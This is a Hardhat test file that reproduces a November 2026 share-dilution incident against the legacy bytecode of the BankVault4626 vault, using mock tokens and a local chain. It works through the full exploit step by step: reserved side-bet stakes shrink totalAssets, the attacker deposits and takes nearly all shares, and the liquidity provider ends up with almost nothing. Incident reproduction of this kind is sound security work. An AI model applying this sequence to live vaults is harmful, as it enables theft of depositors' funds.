import { ethers } from "hardhat";
import { expect } from "chai";
import legacy from "./fixtures/BankVault4626.pre-2026-11-04.json";

async function fixture(old = false, decimals = 18) {
    const [admin, lp, attacker, operator] = await ethers.getSigners();
    const token = await (await ethers.getContractFactory(decimals === 6 ? "MockUSDC" : "MockDAI")).deploy();
    const engine = await (await ethers.getContractFactory("MockEngine")).deploy();
    const factory = old ? new ethers.ContractFactory(legacy.abi, legacy.bytecode, admin) : await ethers.getContractFactory("BankVault4626");
    const impl = await factory.deploy();
    const beacon = await (await ethers.getContractFactory("UpgradeableBeacon")).deploy(await impl.getAddress(), admin.address);
    const init = factory.interface.encodeFunctionData("initialize", [{ assetToken: await token.getAddress(), name: "Incident bank", symbol: "bTEST",
        marketId: 1, engine: await engine.getAddress(), admin: admin.address, minBet: 1n, sideBetController: operator.address }]);
    const proxy = await (await ethers.getContractFactory("BeaconProxy")).deploy(await beacon.getAddress(), init);
    const bank: any = new ethers.Contract(await proxy.getAddress(), factory.interface, admin);
    const unit = 10n ** BigInt(decimals);
    for (const who of [lp, attacker]) {
        await token.mint(who.address, 1_000_000n * unit);
        await (token.connect(who) as any).approve(await bank.getAddress(), ethers.MaxUint256);
    }
    await bank.connect(lp).deposit(1000n * unit, lp.address);
    return { admin, lp, attacker, operator, token, engine, bank, beacon, unit };
}

describe("2026-11-04 reserved-liquidity share dilution", function () {
    it("reproduces the old exploit with the exact deployed implementation bytecode", async function () {
        const { bank, lp, attacker, operator, token } = await fixture(true);
        // Match the incident's raw BRB balance and the five actual ticket sizes.
        const target = 299829114252080586275817n;
        await token.mint(await bank.getAddress(), target - await token.balanceOf(await bank.getAddress()));
        const stakes = [547304358287527217081n, 547304358287527217081n, 547304358287527217081n,
            547304358287527217081n, 543465159420601644699n];
        const reserves = [60597374358287527217043n, 60597374358287527217043n, 60597374358287527217043n,
            60597374358287527217043n, 60172299411501187920579n];
        for (let i = 0; i < stakes.length; i++) await bank.connect(operator).lockSideBetStake(attacker.address, stakes[i], reserves[i]);
        expect(await bank.totalAssets()).to.equal(89n);
        await bank.connect(attacker).deposit(1000000000000000001n, attacker.address);
        expect(await bank.balanceOf(attacker.address) * 10_000n / await bank.totalSupply()).to.equal(9999n);
        await bank.connect(operator).releaseBets(reserves.reduce((a, b) => a + b));
        expect(await bank.convertToAssets(await bank.balanceOf(attacker.address))).to.be.gt(300_000n * 10n ** 18n);
        expect(await bank.convertToAssets(await bank.balanceOf(lp.address))).to.be.lt(10n ** 9n);
    });

});
